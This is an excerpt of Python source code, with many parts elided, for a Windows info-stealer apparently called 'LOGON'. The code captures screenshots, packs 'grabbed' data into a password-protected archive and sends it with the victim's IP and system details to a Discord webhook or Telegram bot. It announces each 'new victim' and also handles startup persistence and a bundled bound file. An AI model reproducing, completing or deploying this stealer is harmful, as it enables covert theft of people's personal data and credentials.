...
Logger = logging.getLogger("LOGON")
...
class LOGON:
    ...
    def TakeScreenshot(self) -> None: # Takes screenshot(s) of all the monitors of the system
        if Settings.CaptureScreenshot:
            ...
            command = "" # Unicode encoded command
    ...
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "logon123"
    ...
    def SendData(self) -> None:
        ...
        filename = "LOGON-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://raw.githubusercontent.com/LOGON/LOGON/main/.github/workflows/image.png"
                payload = {
                    ...
                    "embeds": [
                        {
                            ...
                            "url": "https://github.com/LOGON/LOGON",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by LOGON | https://github.com/LOGON/LOGON"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>LOGON</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
...
if __name__ == "__main__" and os.name == "nt":
    ...
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.logon")):
        try:
